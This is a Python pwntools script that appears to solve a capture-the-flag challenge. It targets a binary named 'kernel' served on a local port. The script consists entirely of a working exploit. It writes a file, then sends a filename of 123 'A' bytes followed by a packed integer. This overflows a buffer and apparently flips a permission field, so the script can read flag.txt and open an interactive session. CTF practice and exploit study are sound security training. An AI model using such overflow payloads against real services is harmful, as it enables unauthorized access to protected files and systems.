#!/usr/bin/env python3

from pwn import *

exe = ELF("kernel")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("127.0.0.1", 9966)

    return r


def write(r, file, content):
    r.recvuntil(b'> ')
    r.sendline(b'write ' + file)
    r.recvuntil(b'editor>> ')
    r.sendline(content)

def read(r, file):
    r.recvuntil(b'> ')
    r.sendline(b'read ' + file)


def main():
    r = conn()

    write(r, b'test.txt', b'test')
    write(r, b'A'*123 + p32(0x1), b'...')
    read(r, b'flag.txt')

    r.interactive()

if __name__ == "__main__":
    main()
